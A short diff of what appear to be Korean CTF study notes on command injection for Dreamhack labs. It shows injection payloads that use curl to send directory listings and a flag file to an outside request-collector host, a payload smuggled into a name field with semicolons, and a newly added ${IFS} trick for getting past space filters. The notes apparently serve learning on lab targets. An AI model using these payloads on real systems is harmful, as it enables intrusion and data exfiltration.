@@ -218,3 +218,5 @@ PHP 외에도 JSP, ASP 등 웹 서버가 해석 가능한 파일을 만들어 �
 	curl https://oqsuldv.request.dreamhack.games/ -d "$(ls -al)"
 	cool_cat_name";curl https://oqsuldv.request.dreamhack.games/ -d "$( cat ./flag.txt)";"
 
+### 공백 우회
+	1.1.1.1;ls${IFS}-al
